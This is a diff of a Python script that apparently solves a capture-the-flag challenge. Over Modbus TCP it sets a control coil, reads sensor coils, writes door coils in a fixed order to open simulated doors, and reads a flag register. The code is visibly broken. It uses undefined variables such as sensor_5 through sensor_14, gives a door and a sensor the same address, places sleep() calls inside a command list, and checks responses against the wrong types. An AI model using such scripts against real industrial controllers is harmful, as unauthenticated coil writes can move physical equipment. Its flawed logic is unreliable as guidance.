@@ -1,13 +1,23 @@
 #!/usr/bin/env python3
 
 import socket
-from time import sleep
+from time import sleep, time
 from umodbus import conf
 from umodbus.client import tcp
-from time import time
 
 # Define Modbus addresses for doors and sensors
-# ... (same as before)
+DOOR_0_ADDR = 0x04
+DOOR_1_ADDR = 0x05
+DOOR_2_ADDR = 0x06
+DOOR_3_ADDR = 0x07
+DOOR_4_ADDR = 0x08
+
+SENSOR_0_ADDR = 0x08
+SENSOR_1_ADDR = 0x09
+SENSOR_2_ADDR = 0x0A
+SENSOR_3_ADDR = 0x0B
+SENSOR_4_ADDR = 0x0C
+# Add other sensor addresses as needed
 
 # Adjust modbus configuration
 conf.SIGNED_VALUES = True
@@ -21,9 +31,153 @@ system_active_command = tcp.write_multiple_coils(slave_id=1, starting_address=0x
 response = tcp.send_message(system_active_command, sock)
 
 # Check if the command was successful
-if response.is_error():
-    print(f"Failed to set the system_active flag. Modbus exception code: {response.exception_code}")
+if isinstance(response, int) and response > 0:
+    print("Failed to set the system_active flag. Modbus exception code:", response)
     sock.close()
     exit()
 else:
     print("System active flag set to 1")
+
+# Define TON timers
+class Timer:
+    def __init__(self):
+        self.start_time = None
+        self.elapsed_time = 0
+        self.running = False
+
+    def start(self):
+        self.start_time = time()
+        self.running = True
+
+    def stop(self):
+        self.elapsed_time += time() - self.start_time
+        self.running = False
+
+    def reset(self):
+        self.elapsed_time = 0
+        self.running = False
+
+    def get_elapsed(self):
+        if self.running:
+            return self.elapsed_time + time() - self.start_time
+        return self.elapsed_time
+
+# Initialize TON timers
+TON0 = Timer()
+TON1 = Timer()
+TON2 = Timer()
+TON3 = Timer()
+TON4 = Timer()
+
+# Read sensor values
+sensor_values_response = tcp.read_coils(slave_id=1, starting_address=SENSOR_0_ADDR, quantity=5)
+
+# Check if the sensor values response is valid and contains data
+if isinstance(sensor_values_response, bytes) and len(sensor_values_response) == 1:
+    sensor_values = [int(bit) for bit in sensor_values_response.bits]
+    print(f"Sensor Values: {sensor_values}")
+else:
+    print("Failed to read sensor values. Exiting...")
+    sock.close()
+    exit()
+
+# Define ladder logic conditions and control coils
+Door_0 = False
+Door_1 = False
+Door_2 = False
+Door_3 = False
+Door_4 = False
+
+sensor_0 = sensor_values[0]
+sensor_1 = sensor_values[1]
+sensor_2 = sensor_values[2]
+sensor_3 = sensor_values[3]
+sensor_4 = sensor_values[4]
+
+system_active = True
+
+# Ladder logic conditions and control coils
+if not Door_4 and not Door_3 and not Door_2 and not Door_1 and sensor_4 and not sensor_2 and sensor_1 and sensor_0 and system_active:
+    TON0.start()
+    if TON0.get_elapsed() >= 8:
+        Door_0 = True
+
+if not Door_4 and not Door_3 and not Door_2 and not Door_0 and sensor_7 and not sensor_6 and sensor_5 and sensor_0 and system_active:
+    TON1.start()
+    if TON1.get_elapsed() >= 5:
+        Door_1 = True
+
+if not Door_4 and not Door_3 and not Door_1 and not Door_0 and sensor_11 and not sensor_7 and sensor_10 and sensor_5 and system_active:
+    TON2.start()
+    if TON2.get_elapsed() >= 8:
+        Door_2 = True
+
+if not Door_4 and not Door_1 and not Door_2 and not Door_0 and sensor_13 and sensor_12 and not sensor_11 and sensor_10 and system_active:
+    TON3.start()
+    if TON3.get_elapsed() >= 5:
+        Door_3 = True
+
+if not Door_1 and not Door_3 and not Door_2 and not Door_0 and sensor_14 and sensor_13 and sensor_12 and sensor_10 and system_active:
+    TON4.start()
+    if TON4.get_elapsed() >= 8:
+        Door_4 = True
+
+# Command sequence to open the doors in the specified order
+commands = [
+    tcp.write_single_coil(slave_id=1, address=DOOR_3_ADDR, value=Door_3),
+    sleep(1),
+    tcp.write_single_coil(slave_id=1, address=DOOR_0_ADDR, value=Door_0),
+    sleep(1),
+    tcp.write_single_coil(slave_id=1, address=DOOR_4_ADDR, value=Door_4),
+    sleep(1),
+    tcp.write_single_coil(slave_id=1, address=DOOR_1_ADDR, value=Door_1),
+    sleep(1),
+    tcp.write_single_coil(slave_id=1, address=DOOR_2_ADDR, value=Door_2),
+    sleep(1),
+]
+
+# Send the command sequence to the network
+for command in commands:
+    response = tcp.send_message(command, sock)
+
+    # Check if the command was successful
+    if isinstance(response, int) and response > 0:
+        print("Failed to send command. Modbus exception code:", response)
+        sock.close()
+        exit()
+
+    sleep(1)  # Wait for 1 second after each command
+
+# Add a delay to ensure the door is fully open before reading the flag
+sleep(5)
+
+# Read the flag from holding registers
+flag_response = tcp.read_holding_registers(slave_id=1, starting_address=4, quantity=1)
+
+# Check if the flag response is valid and contains data
+if isinstance(flag_response, bytes) and len(flag_response) == 2:
+    flag = int.from_bytes(flag_response, byteorder='big')
+    print(f"CTF Flag: {flag}")
+else:
+    print("Failed to read the flag. Exiting...")
+    sock.close()
+    exit()
+
+# Add a delay for system reset (2 minutes = 120 seconds)
+print("System reset in progress...")
+sleep(120)
+
+# Set the system_active flag to 0 for system reset
+system_active_command_reset = tcp.write_multiple_coils(slave_id=1, starting_address=0x075, values=[False])
+response_reset = tcp.send_message(system_active_command_reset, sock)
+
+# Check if the command was successful
+if isinstance(response_reset, int) and response_reset > 0:
+    print("Failed to reset the system_active flag. Modbus exception code:", response_reset)
+    sock.close()
+    exit()
+else:
+    print("System reset complete. Exiting...")
+
+# Close the connection
+sock.close()
